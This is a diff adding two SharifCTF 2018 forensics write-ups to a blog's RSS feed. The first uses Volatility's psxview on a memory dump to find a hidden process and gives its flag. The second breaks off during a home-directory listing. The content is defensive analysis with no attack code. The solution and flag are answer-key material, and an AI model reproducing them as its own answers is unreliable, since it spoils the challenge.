@@ -7,6 +7,206 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>SharifCTF 2018 - hidden</title>
+        <description>&lt;p&gt;Another challenge from &lt;a href=&quot;http://ctf.certcc.ir/ctf8/&quot;&gt;SharifCTF&lt;/a&gt; called &lt;strong&gt;&lt;em&gt;hidden&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Category: Forensics&lt;/li&gt;
+  &lt;li&gt;Points: 100&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Find the hidden process.
+
+The flag is SharifCTF{MD5(Process id)}.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;First inspections using the &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; command does not reveal a lot, but we seem to get what’s the content of the dump with the &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; tool.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;main:~/projects/sharictf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file dump
+dump: data
+main:~/projects/sharictf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; strings dump
+...
+Microsoft DH SChannel Cryptographic Provider
+dhTl
+vPrivateKeyInfoEncode
+IPSec Policy agent endpoint
+IPSec Policy agent endpoint
+IPSec Policy agent endpoint
+IPSec Policy agent endpoint
+IPSec Policy agent endpoint
+&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;IPE&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;sass
+&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;SECURE-CBE6C864
+...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As we know that’s it’s the memory dump, I decided to run this awesome linux tool for memory dump analysis called &lt;strong&gt;&lt;em&gt;Volatility&lt;/em&gt;&lt;/strong&gt;. Firstly I’ll run it with &lt;code class=&quot;highlighter-rouge&quot;&gt;imageinfo&lt;/code&gt; option that will show us basic information about the dump.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;main:~/projects/sharictf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; volatility imageinfo &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump
+Volatility Foundation Volatility Framework 2.6
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+          Suggested Profile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : WinXPSP2x86, WinXPSP3x86 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Instantiated with WinXPSP2x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                     AS Layer1 : IA32PagedMemoryPae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Kernel AS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                     AS Layer2 : FileAddressSpace &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/home/w3ndige/projects/sharictf/dump&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                      PAE &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; : PAE
+                           DTB : 0x359000L
+                          KDBG : 0x80545c60L
+          Number of Processors : 1
+     Image Type &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Service Pack&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 3
+                KPCR &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;CPU 0 : 0xffdff000L
+             KUSER_SHARED_DATA : 0xffdf0000L
+           Image &lt;span class=&quot;nb&quot;&gt;date &lt;/span&gt;and &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; : 2018-01-28 17:35:20 UTC+0000
+     Image &lt;span class=&quot;nb&quot;&gt;local date &lt;/span&gt;and &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; : 2018-01-28 21:05:20 +0330&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From that information, the most essential one is the suggested profile &lt;code class=&quot;highlighter-rouge&quot;&gt;WinXPSP2x86&lt;/code&gt;, we’ll use it in later analysis. As we have to get the PID of the hidden process, I decided to look into the documentation of this tool and here it is - &lt;code class=&quot;highlighter-rouge&quot;&gt;psxview&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;This plugin helps you detect hidden processes by comparing what PsActiveProcessHead contains with what is reported by various other sources of process listings. It compares the following:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s run the analysis.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;main:~/projects/sharictf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; volatility &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;WinXPSP2x86 psxview &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; dump
+Volatility Foundation Volatility Framework 2.6
+Offset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;P&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  Name                    PID pslist psscan thrdproc pspcid csrss session deskthrd ExitTime
+&lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;
+0x010eb4c0 rundll32.exe            396 True   True   False    True   True  True    True     
+0x01c279c0 svchost.exe             900 True   True   False    True   True  True    True     
+0x01e64350 vmtoolsd.exe            404 False  True   False    True   True  True    True     
+0x025b7020 explorer.exe           1576 True   True   False    True   True  True    True     
+0x01e6d608 winlogon.exe            644 True   True   False    True   True  True    True     
+0x01ecd378 svchost.exe             988 True   True   False    True   True  True    True     
+0x031b1cf0 spoolsv.exe            1508 True   True   False    True   True  True    True     
+0x01fbe410 lsass.exe               700 True   True   False    True   True  True    True     
+0x0096c0e8 wscntfy.exe             920 True   True   False    True   True  True    True     
+0x039347a8 svchost.exe            1188 True   True   False    True   True  True    True     
+0x0308d9f0 svchost.exe            1604 True   True   False    True   True  True    True     
+0x01c58798 vmacthlp.exe            856 True   True   False    True   True  True    True     
+0x01de4878 svchost.exe            1236 True   True   False    True   True  True    True     
+0x01bbd488 services.exe            688 True   True   False    True   True  True    True     
+0x01fbd6e0 svchost.exe            1024 True   True   False    True   True  True    True     
+0x02e7eb20 svchost.exe            1692 True   True   False    True   True  True    True     
+0x01209a00 System                    4 True   True   False    True   False False   False    
+0x01bbd900 smss.exe                548 True   True   False    True   False False   False    
+0x021a7da0 csrss.exe               620 True   True   False    True   False True    True     
+0x02dbb448 wmiprvse.exe            908 False  True   False    False  False False   False    2018-01-28 17:34:22 UTC+0000
+0x01ebe168 cmd.exe                1704 False  True   False    False  False False   False    2018-01-28 17:34:00 UTC+0000&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can see that the only process with false value is &lt;code class=&quot;highlighter-rouge&quot;&gt;vmtoolsd.exe&lt;/code&gt; with PID &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt;. The last step is to calculate MD5 hash out of that PID and submit the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SharifCTF{4f4adcbf8c6f66dcfc8a3282ac2bf10a}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;tools&quot;&gt;Tools&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/volatilityfoundation/volatility&quot;&gt;Volatility&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal#psxview&quot;&gt;https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal#psxview&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=ceXT9fBGJaI&quot;&gt;https://www.youtube.com/watch?v=ceXT9fBGJaI&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 03 Feb 2018 02:00:00 +0000</pubDate>
+        <link>http://localhost:4000/sharifctf-hidden/</link>
+        <guid isPermaLink="true">http://localhost:4000/sharifctf-hidden/</guid>
+      </item>
+    
+      <item>
+        <title>SharifCTF 2018 - client01</title>
+        <description>&lt;p&gt;Here we have a challenge from this year &lt;a href=&quot;http://ctf.certcc.ir/ctf8/&quot;&gt;SharifCTF&lt;/a&gt; called &lt;strong&gt;&lt;em&gt;client01&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Category: Forensics&lt;/li&gt;
+  &lt;li&gt;Points: 75&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Attached file is the homepage of the client01. He knows the flag.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;As the only thing we get is the home page of some user, I decided to look in for some clues in different places.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;projects&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sharictf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client01&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;la&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;razem&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;220&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bash_logout&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3526&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bashrc&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cinnamon&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Desktop&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;   &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dmrc&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Documents&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Downloads&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gconf&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnupg&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;632&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ICEauthority&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;------&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mozilla&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w3ndige&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Music&lt;/span&gt;
